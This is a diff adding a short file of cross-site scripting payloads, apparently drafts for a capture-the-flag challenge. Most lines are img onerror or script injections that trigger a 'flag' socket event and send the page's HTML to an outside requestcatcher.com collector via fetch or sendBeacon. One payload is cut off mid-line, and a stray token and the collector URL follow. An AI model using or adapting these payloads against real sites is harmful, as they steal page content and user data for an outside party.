@@ -1,0 +1,15 @@
+<img src=x onerror="setTimeout(()=>{socket.emit('flag');setTimeout(()=>{navigator.sendBeacon('https://bianapis.requestcatcher.com/test?',document.body.innerHTML)},500);},500)">
+
+<img src=x onerror="socket.emit('flag'); setTimeout(() => fetch('https://bianapis.requestcatcher.com/test?'+ document.body.innerHTML), 500);">
+
+
+
+<img src=x onerror="setTimeout(()=>{socket.emit('flag');setTimeout(()"
+
+<script>fetch('https://bian.requestcatcher.com/test?'+socket.emit('flag'))</script>
+
+<img src=x onerror="fetch('https://bian.requestcatcher.com/test?'+socket.emit('flag'))">
+
+5facv75g
+
+https://bianapis.requestcatcher.com/test
